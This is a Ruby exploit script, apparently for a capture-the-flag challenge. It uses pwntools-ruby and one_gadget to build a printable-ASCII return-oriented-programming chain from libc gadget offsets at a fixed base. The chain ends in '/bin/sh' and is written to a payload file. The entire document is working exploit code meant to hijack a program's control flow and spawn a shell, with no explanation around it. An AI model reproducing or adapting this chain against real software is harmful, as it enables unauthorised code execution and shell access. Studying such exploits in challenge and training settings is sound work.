#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'      # https://github.com/peter50216/pwntools-ruby
require 'heapinfo' # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

#================= Exploit Start ====================
def check(s)
  p "fail #{s.u32.hex}" if s.bytes.any?{|c| c <=32 || c > 126}
end

def packing(val)
  val += 0x5555E000
  check(p32(val))
  p32(val)
end
# 0x000c7352 : add eax, 0x108 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x00098430 : add eax, 8 ; ret
# 0x000a8476 : mov ebx, edx ; cmp eax, 0xfffff001 ; jae 0xa8489 ; ret
# 0x00148730 : add edx, 0xf ; jl 0x148748 ; xor eax, eax ; ret

p = ''.ljust(32, 'A')
p += packing(0x00148730) * 10
p += packing(0x0a8476)
p += packing(0x00148730)
p += packing(0x0009816f)
p += packing(0x00168864) * 14
p += packing(0x00109176)

p = p.ljust(11 * 12 + 36 + 100 - 2, 'B') + "/bin/sh"

IO.binwrite('payload', p + "\n")
